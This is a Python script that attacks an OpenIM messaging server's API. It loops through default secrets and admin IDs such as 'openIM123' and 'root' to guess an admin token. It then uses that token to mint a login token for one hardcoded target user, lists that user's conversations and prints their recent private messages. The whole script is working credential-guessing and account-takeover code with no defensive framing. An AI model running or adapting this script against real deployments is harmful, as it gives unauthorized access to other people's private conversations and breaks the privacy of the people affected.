import requests
import time
import json

# Configuration
API_URL = "http://127.0.0.1:10002"
TARGET_USER_ID = "7179594694"

# Potential credentials to try
SECRETS = ["openIM123", "openIM123456", "123456"]
ADMIN_IDS = ["imAdmin", "openIM123456", "admin", "root"]

def get_admin_token():
    """Attempt to get Admin Token by trying different credentials."""
    url = f"{API_URL}/auth/get_admin_token"
    headers = {"operationID": str(time.time())}
    
    for secret in SECRETS:
        for admin_id in ADMIN_IDS:
            payload = {
                "secret": secret,
                "userID": admin_id
            }
            try:
                print(f"[*] Trying Admin Token with secret='{secret}', userID='{admin_id}'...")
                resp = requests.post(url, json=payload, headers=headers)
                data = resp.json()
                
                if data.get("errCode") == 0:
                    token = data.get("data", {}).get("token") or data.get("token")
                    if token:
                        print(f"[+] Success! Admin Token found.")
                        return token, secret, admin_id
                else:
                    print(f"[-] Failed: {data}")
            except Exception as e:
                print(f"[-] Exception: {e}")
    
    print("[-] Failed to find valid Admin credentials.")
    return None, None, None

def get_user_token(admin_token, secret, user_id):
    """Get User Token using Admin Token."""
    url = f"{API_URL}/auth/get_user_token"
    headers = {
        "operationID": str(time.time()),
        "token": admin_token
    }
    payload = {
        "secret": secret,
        "platformID": 1, 
        "userID": user_id
    }
    
    print(f"[*] Getting User Token for {user_id}...")
    try:
        resp = requests.post(url, json=payload, headers=headers)
        data = resp.json()
        if data.get("errCode") == 0:
            return data.get("data", {}).get("token") or data.get("token")
        else:
            print(f"[-] Failed to get User Token: {data}")
            return None
    except Exception as e:
        print(f"[-] Exception getting User Token: {e}")
        return None

def get_conversations(user_token, user_id):
    """Get conversations for the user."""
    url = f"{API_URL}/conversation/get_all_conversations"
    headers = {
        "operationID": str(time.time()),
        "token": user_token
    }
    payload = {"ownerUserID": user_id}
    
    try:
        resp = requests.post(url, json=payload, headers=headers)
        data = resp.json()
        if data.get("errCode") == 0:
            return data.get("data", {}).get("conversations", [])
        return []
    except Exception:
        return []

def get_history(user_token, user_id, conversation_id):
    """Get history for a conversation."""
    # First get max seq
    max_seq_url = f"{API_URL}/msg/get_max_seq"
    headers = {"operationID": str(time.time()), "token": user_token}
    max_seq = 0
    
    try:
        print(f"[*] Getting max seq for conversation {conversation_id}...")
        resp = requests.post(max_seq_url, json={"conversationID": conversation_id}, headers=headers)
        data = resp.json()
        print(f"[*] Max seq response: {data}")
        max_seq = data.get("data", {}).get("maxSeq", 0)
        print(f"[*] Max seq: {max_seq}")
    except Exception as e:
        print(f"[-] Error getting max seq: {e}")
        max_seq = 100

    # Pull messages
    url = f"{API_URL}/msg/pull_msg_by_seq"
    begin_seq = max(0, max_seq - 20)
    payload = {
        "userID": user_id,
        "conversationID": conversation_id,
        "beginSeq": begin_seq,
        "endSeq": max_seq,
        "num": 20
    }
    
    print(f"[*] Pulling messages from seq {begin_seq} to {max_seq}...")
    try:
        resp = requests.post(url, json=payload, headers=headers)
        data = resp.json()
        print(f"[*] Pull messages response: {data}")
        messages = data.get("data", {}).get("list", [])
        print(f"[*] Retrieved {len(messages)} messages")
        return messages
    except Exception as e:
        print(f"[-] Error pulling messages: {e}")
        return []

def main():
    print("[*] Starting credential discovery...")
    admin_token, secret, admin_id = get_admin_token()
    
    if not admin_token:
        print("[-] Could not authenticate as Admin. Please check server config.")
        return

    print(f"[*] Getting User Token for {TARGET_USER_ID}...")
    user_token = get_user_token(admin_token, secret, TARGET_USER_ID)
    
    if not user_token:
        print("[-] Could not get User Token.")
        return
        
    print("[*] Fetching conversations...")
    conversations = get_conversations(user_token, TARGET_USER_ID)
    print(f"[+] Found {len(conversations)} conversations.")
    
    if conversations:
        conv = conversations[0]
        cid = conv.get("conversationID")
        name = conv.get("showName")
        print(f"\n[*] Reading history for: {name} ({cid})")
        msgs = get_history(user_token, TARGET_USER_ID, cid)
        
        for m in msgs:
            try:
                content = json.loads(m.get("content"))
                text = content.get("text", m.get("content"))
            except:
                text = m.get("content")
            print(f"  - {m.get('sendID')}: {text}")

if __name__ == "__main__":
    main()
